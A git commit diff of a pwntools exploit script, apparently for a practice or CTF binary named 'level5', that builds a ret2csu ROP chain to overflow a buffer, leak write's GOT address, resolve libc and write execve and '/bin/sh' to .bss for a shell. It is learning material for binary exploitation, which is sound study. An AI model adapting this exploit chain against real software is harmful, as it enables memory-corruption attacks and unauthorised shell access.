52fd5f376619a6d28e4d5d44d435a5fee398b626
Yatogaii <781023956@qq.com>
2023-11-05 18:36:03 +0800

    成功写入到rss

--- level5.py
+++ level5.py
@@ -1,15 +1,17 @@
 from pwn import *
 from LibcSearcher import LibcSearcher
 
-def craft_ret2csu_payload(csu_gadget_addr, func_gadget_addr, rbx, rbp, r12, r13, r14, r15, last):
+gadget_csu = 0x0040061a
+gadget_func = 0x00400600
+
+def craft_ret2csu_payload(csu_gadget_addr, func_gadget_addr, rbx, rbp, r12, r15, r14, r13, last):
     # This function assumes that the 'csu_gadget_addr' pops the values into the registers
     # and then calls the function pointer at 'func_gadget_addr', which will use those register
     # values to perform the operation.
 
     # Padding to reach the return address, assuming a buffer overflow at 128 bytes
     # plus 8 bytes for the saved RBP (this may need to be adjusted for your specific binary)
-    buf_size = 128 + 8
-    payload = b"A" * buf_size
+    payload = b"a" * 128 + b'b'*8
 
     # Add the CSU gadget address
     payload += p64(csu_gadget_addr)
@@ -18,6 +20,7 @@ def craft_ret2csu_payload(csu_gadget_addr, func_gadget_addr, rbx, rbp, r12, r13,
     payload += p64(rbx)   # rbx value to be popped into rbx register
     payload += p64(rbp)   # rbp value to be popped into rbp register
     payload += p64(r12)   # r12 value to be popped into r12 register (will be used in the call)
+    # 一定要注意这里的参数是反着的
     payload += p64(r13)   # r13 value to be popped into rdi register
     payload += p64(r14)   # r14 value to be popped into rsi register
     payload += p64(r15)   # r15 value to be popped into rdx register
@@ -30,8 +33,7 @@ def craft_ret2csu_payload(csu_gadget_addr, func_gadget_addr, rbx, rbp, r12, r13,
     # This often includes padding for any additional pops that may occur in the gadgets
     # For this example, I am using '7 * 8' to account for 7 potential pops
     # This may need to be adjusted based on the specific gadgets you are using.
-    padding_between = 7 * 8  # Adjust this value as needed for your gadgets
-    payload += b"B" * padding_between
+    payload += b"c" * 56
 
     # The address to return to after the function call is complete
     payload += p64(last)
@@ -39,38 +41,63 @@ def craft_ret2csu_payload(csu_gadget_addr, func_gadget_addr, rbx, rbp, r12, r13,
     return payload
 
 if __name__ == '__main__':
+    context.log_level = 'debug'
+    # sh = gdb.debug('./level5', "b *0x400586")
     l5 = ELF('./level5')
-
+    bin_sh_offset = 0x1382e8
     main = l5.symbols['main']
-    print(hex(main))
 
     # step1: 获取 write 的 GOT 地址
-    payload1 = craft_ret2csu_payload(0x0040061a, # gadget csu
-                                     0x004005ec, # gadget func
+    # write(1, write_got, 8)
+    payload1 = craft_ret2csu_payload(gadget_csu, # gadget csu
+                                     gadget_func, # 0x004005ec, # gadget func
                                      0,          # rbx
                                      1,          # rbp
                                      l5.got["write"],  # r12 write.got
-                                     1,          # r13 stdout
-                                     l5.got["write"],  # r14 buffer 6278066737626506568
-                                     8,          # r15 size
+                                     1,          # para1 stdout
+                                     l5.got["write"],  # para2 buffer 6278066737626506568
+                                     8,          # para3 size
                                      main # ret
                                      )
 
     sh = process('./level5')
 
-    sh.recvuntil('Hello, World\n')
+    log.info(sh.recv())
     sh.send(payload1)
-    write_addr = u64(sh.recv(8))
 
     # 确定了 libc 版本为 libc6-amd64_2.13-0ubuntu13.2_i386
+    write_addr = u64(sh.recv(8))
     log.success(f'write addr {write_addr}')
 
     # 读取完 Helloworld 这一串输出，但是很奇怪这里读取到的是 'orld\n'
     log.info(sh.recv())
 
     # step2: 获取 execve 在程序中的真实地址
-    libc = ELF('libc6-amd64_2.13-0ubuntu13.2_i386.so')
-    execve_offset = libc.symbols['execve']  # execve在libc中的偏移量
-    libc_base = write_addr - libc.symbols['write']  # 计算出libc的基址
+    libc = LibcSearcher('write', write_addr)
+    # libc = ELF('./libc6-amd64_2.13-0ubuntu13.2_i386.so')
+    # execve_offset = libc.symbols['execve']  # execve在libc中的偏移量
+    # libc_base = write_addr - libc.symbols['write']  # 计算出libc的基址
+    execve_offset = libc.dump('execve')  # execve在libc中的偏移量
+    libc_base = write_addr - libc.dump('write')  # 计算出libc的基址
     execve_addr = libc_base + execve_offset  # 通过偏移量计算execve的实际地址
     log.success(f'execve addr: {execve_addr}')
+
+    # step3: 构造 /bin/sh
+    bss_addr = l5.bss()
+    log.success(f'bss addr: {bss_addr}')
+    # read(0, bss_base, 16)
+    payload2 = craft_ret2csu_payload(gadget_csu, # gadget csu
+                                     gadget_func, # gadget func
+                                     0,          # rbx
+                                     1,          # rbp
+                                     l5.got['read'],  # r12 write.got
+                                     0,          # r13 stdin
+                                     bss_addr,  # r14 write to bss
+                                     16,          # r15 read size
+                                     main # ret
+                                     )
+    sh.send(payload2)
+    sleep(1)
+    sh.send(p64(execve_addr))
+    sh.send(b'/bin/sh\00')
+    log.info(sh.recv())
